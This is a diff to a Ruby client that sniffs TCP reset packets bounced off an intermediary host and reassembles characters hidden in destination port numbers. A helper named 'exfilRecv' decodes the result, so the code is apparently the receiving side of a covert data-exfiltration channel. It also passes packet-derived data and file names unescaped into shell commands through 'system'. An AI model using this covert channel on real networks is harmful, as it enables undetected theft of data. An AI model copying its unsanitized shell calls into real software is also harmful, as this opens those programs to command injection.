@@ -22,11 +22,12 @@ class Client
         array = str[3..-1].split("/")
         fn = array[array.length - 1]
         system("rm -f #{fn}")
-        Thread.new{ readPackets(fn) }
+        readPackets(fn)
       else
         @conn.cliSend(str)
-        Thread.new{ readPackets() }
+        readPackets()
       end
+      STDIN.flush
     end
   end
 
@@ -48,29 +49,30 @@ private
   end
 
   def tcp(dl = nil)
-    filter = "tcp and tcp[3] & 4!=0 and src #{$tcpBounceIp}"
+    filter = "tcp and tcp[13] & 4!=0 and src #{$tcpBounceIp}"
+    str = ""
+    i = 0
     cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)
 
     cap.stream.each do |p|
       pkt = Packet.parse p
-          puts "asdfasdf"
       if pkt.is_tcp?
         puts "packet Recieved"
         if (pkt.tcp_dst == 2560)
           puts "final packet"
-          STDOUT.flush
+          result = exfilRecv(str)
+          if (dl.nil?)
+            print result
+            STDOUT.flush
+          else
+            system("echo -ne #{result} > #{dl}")
+          end
           return
         end
-        puts "aa"
         char = (pkt.tcp_dst >> 8).chr
-        puts "bb"
-        if (dl.nil?)
-          print char
-          puts "printing to screen"
-        else
-          puts "putting to file"
-          system("echo -ne #{char} >> #{dl}")
-        end
+        str += " "
+        str[i] = char
+        i += 1
       end
     end
   end
